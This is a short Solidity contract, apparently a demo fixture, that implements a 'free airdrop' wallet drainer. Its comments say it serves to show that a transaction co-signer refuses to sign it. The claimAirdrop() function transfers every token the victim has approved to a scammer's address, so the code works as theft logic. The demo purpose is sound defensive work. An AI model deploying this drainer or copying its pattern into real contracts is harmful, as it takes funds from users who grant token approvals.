// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ScamAirdrop — DEMO ONLY, deliberately malicious
 * @notice A typical "wallet drainer": the page promises a free airdrop, asks for an unlimited token approval,
 * then `claimAirdrop()` pulls everything the victim approved to the scammer.
 * Used to show that Swissquote's co-signer refuses to co-sign it (not on the approved list, unlimited
 * approval, simulation shows the balance leaving to an unknown address).
 */
contract ScamAirdrop {
    IERC20 public immutable token;
    address public immutable scammer;

    event Claimed(address indexed victim, uint256 stolen);

    constructor(IERC20 token_, address scammer_) {
        token = token_;
        scammer = scammer_;
    }

    function claimAirdrop() external {
        uint256 balance = token.balanceOf(msg.sender);
        uint256 approved = token.allowance(msg.sender, address(this));
        uint256 amount = balance < approved ? balance : approved;
        if (amount > 0) require(token.transferFrom(msg.sender, scammer, amount), "transfer failed");
        emit Claimed(msg.sender, amount);
    }
}
